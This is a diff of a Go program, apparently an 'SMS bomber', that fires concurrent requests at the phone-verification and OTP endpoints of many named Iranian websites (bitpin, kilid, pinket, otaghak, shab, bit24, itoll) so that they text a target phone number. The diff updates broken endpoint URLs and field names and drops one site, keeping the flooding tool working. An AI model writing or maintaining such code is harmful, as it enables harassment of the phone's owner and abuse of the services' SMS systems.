@@ -185,25 +185,23 @@ func main() {
  //delete site : not box phone number
 		go sms("https://api.bitpin.ir/v1/usr/sub_phone/", map[string]interface{}{
 			"phone=": phone,
-		}, ch)
-		go sms("https://chamedoon.com/api/v1/membership/guest/request_mobile_verification", map[string]interface{}{
-			"mobile": phone,
-		}, ch)
+		}, ch)  //Password required
+//delete site az domain
 		go sms("https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL", map[string]interface{}{
 			"mobile": phone,
-		}, ch)
+		}, ch)  // idon't know ???
 		go sms("https://pinket.com/api/cu/v2/phone-verification", map[string]interface{}{
 			"phoneNumber": phone,
-		}, ch)
+		}, ch)  // edit :4/22/2025
 		go sms("https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode", map[string]interface{}{
-			"userName": phone,
-		}, ch)
-		go sms("https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile", map[string]interface{}{
+			"username": phone,
+		}, ch)  // edit :4/22/2025
+		go sms("https://api.shab.ir/api/fa/sandbox/v_1_4/auth/login-otp", map[string]interface{}{
 			"mobile": phone,
-		}, ch)
-		go sms("https://bit24.cash/app/api/auth/check-mobile", map[string]interface{}{
+		}, ch)  // edit :4/22/2025
+		go sms("https://bit24.cash/auth/api/sso/v2/users/auth/register/send-code", map[string]interface{}{
 			"mobile": phone,
-		}, ch)
+		}, ch)  // edit :4/22/2025
 		go sms("https://app.itoll.ir/api/v1/auth/login", map[string]interface{}{
 			"mobile": phone,
 		}, ch)
